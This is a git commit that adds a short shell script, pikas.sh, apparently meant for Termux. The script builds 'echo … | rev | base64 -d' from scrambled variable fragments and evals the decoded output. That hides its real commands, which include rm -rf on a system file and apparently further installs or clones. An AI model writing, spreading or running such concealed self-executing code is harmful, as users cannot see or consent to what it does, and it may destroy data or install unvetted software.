4c59cbb1acf971e53ef767145e300c3bc4c64570
luisakrac <50025904+luisakrac@users.noreply.github.com>
2019-11-15 00:32:13 -0600

    Add files via upload

---
+++ pikas.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogC0lGelpgchVGbjpwQDFkULBiZy1CItJnCzNXYrlGcgYmctASbypAZjpwY0V2LyNXdvMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvAyYyh2chJmLoNXYiBidttzc392YvUmchh2cvI3c19yclxWam9Ce11mclRnLt92YvEGdhR2LhRXYk9CI392Yuc3bl1GI212ODNUQStEIkN2O0l2ZuM0QBJ1SvMWYytWYzlWds9SbvNmLiVHa0l2Zv8iOzBHd0hGIl52bsNGI0l2ZKogchVGbjpQehN3dvNGIsxWY0NnbpByZrBnCyFWZsNmC0F2Ys9GbgwGbhR3culGItV2ZKIXYlx2YKknY1JHIsxWY0NnbpByZrBnCyFWZsNmCkR3bt9yY0V2LyNXdvMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvAiZy1CItJnCkNmCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
